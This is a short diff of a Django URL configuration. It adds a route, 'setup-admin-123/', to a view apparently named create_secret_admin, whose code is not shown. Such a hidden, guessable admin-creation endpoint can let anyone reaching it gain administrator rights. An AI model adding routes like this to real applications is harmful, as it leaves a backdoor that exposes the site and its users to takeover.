@@ -16,4 +16,7 @@ urlpatterns = [
     path('login/', auth_views.LoginView.as_view(template_name='core/login.html'), name='login'),
     # Django 5+ me LogoutView post request mangta hai HTML me, isliye custom view best hai
     path('logout/', views.custom_logout, name='logout'),
+    
+    
+    path('setup-admin-123/', views.create_secret_admin, name='setup_admin'),
 ]
